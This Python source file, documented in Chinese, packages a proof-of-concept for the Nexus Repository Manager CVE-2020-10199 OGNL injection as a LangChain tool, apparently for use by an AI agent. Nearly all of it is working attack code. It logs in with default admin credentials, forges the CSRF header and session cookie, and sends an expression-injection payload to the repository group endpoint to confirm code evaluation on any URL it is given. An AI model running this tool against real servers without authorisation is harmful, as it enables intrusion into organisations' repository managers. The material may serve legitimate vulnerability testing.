# -*- coding:utf-8 -*-
"""
Nexus漏洞POC验证工具
使用@tool装饰器封装backend.poc.nexus模块
"""

from langchain.tools import tool
from typing import Dict, Any
import base64


@tool
def nexus_cve_2020_10199(target: str, timeout: int = 10) -> Dict[str, Any]:
    """Nexus Repository Manager CVE-2020-10199 OGNL注入漏洞检测工具
    
    检测目标是否存在Nexus Repository Manager 3.x OGNL表达式注入漏洞。
    攻击者可以通过构造恶意的请求来执行任意代码。
    
    影响版本:
    - Nexus Repository Manager 3.21.1 及以下版本
    
    检测原理:
    通过向/service/rest/beta/repositories/go/group端点发送包含
    OGNL表达式的恶意请求。如果服务器返回计算结果，则说明存在漏洞。
    
    Args:
        target: 目标URL，如 http://127.0.0.1:8081
        timeout: 请求超时时间(秒)，默认10秒
        
    Returns:
        包含检测结果的字典，包括：
        - success: 执行状态(True/False)
        - data: 执行结果数据
        - error: 错误信息(成功时为None)
        - metadata: 元数据(工具名称、目标、漏洞信息等)
    """
    try:
        import requests
        import json
        from urllib.parse import urlparse
        from requests.packages.urllib3.exceptions import InsecureRequestWarning
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        
        csrf = "0.15080630880112578"
        password = "admin"
        
        parsed = urlparse(target)
        ip = parsed.hostname or parsed.netloc.split(':')[0]
        port = parsed.port or (8081 if parsed.scheme == 'http' else None)
        
        if not port:
            port = 8081
            
        target_url = "http://" + ip + ":" + str(port)
        login_url = target_url + "/service/rapture/session"
        
        head = {"Content-Type": "application/x-www-form-urlencoded"}
        payload = {
            'username': str(base64.b64encode("admin".encode('utf-8')))[2:-1],
            'password': str(base64.b64encode(password.encode('utf-8')))[2:-1]
        }
        
        resp = requests.request("post", login_url, data=payload, headers=head, timeout=timeout)
        sessionid = resp.headers['Set-Cookie'].split(";")[0].split('=')[1]
        
        headers = {
            "Host": "%s:%s" % (ip, port),
            "Referer": target_url,
            "X-Nexus-UI": "true",
            "X-Requested-With": "XMLHttpRequest",
            "NX-ANTI-CSRF-TOKEN": csrf,
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json",
            "Cookie": "NX-ANTI-CSRF-TOKEN=%s; NXSESSIONID=%s" % (csrf, sessionid),
            "Origin": target_url,
            "Connection": "close"
        }
        
        vulurl = target_url + "/service/rest/beta/repositories/go/group"
        payload_data = {
            "name": "internal",
            "online": "true",
            "storage": {"blobStoreName": "default", "strictContentTypeValidation": "true"},
            "group": {"memberNames": ["$\\A{233*233}"]}
        }
        
        r = requests.post(vulurl, data=json.dumps(payload_data), headers=headers, timeout=timeout)
        
        if "A54289" in r.text:
            return {
                "success": True,
                "data": {
                    "vulnerable": True,
                    "cve_id": "CVE-2020-10199",
                    "vulnerability": "Nexus Repository Manager OGNL Injection RCE",
                    "target": target_url
                },
                "error": None,
                "metadata": {
                    "tool": "nexus_cve_2020_10199",
                    "target": target,
                    "cve_id": "CVE-2020-10199",
                    "severity": "critical"
                }
            }
        else:
            return {
                "success": True,
                "data": {
                    "vulnerable": False,
                    "cve_id": "CVE-2020-10199",
                    "target": target_url
                },
                "error": None,
                "metadata": {
                    "tool": "nexus_cve_2020_10199",
                    "target": target,
                    "cve_id": "CVE-2020-10199"
                }
            }
    except ImportError as e:
        return {
            "success": False,
            "data": None,
            "error": f"导入requests模块失败: {str(e)}",
            "metadata": {"tool": "nexus_cve_2020_10199", "target": target}
        }
    except Exception as e:
        return {
            "success": False,
            "data": None,
            "error": f"执行nexus_cve_2020_10199工具异常: {str(e)}",
            "metadata": {"tool": "nexus_cve_2020_10199", "target": target}
        }


if __name__ == "__main__":
    test_result = nexus_cve_2020_10199.invoke("http://127.0.0.1:8081")
    print(test_result)
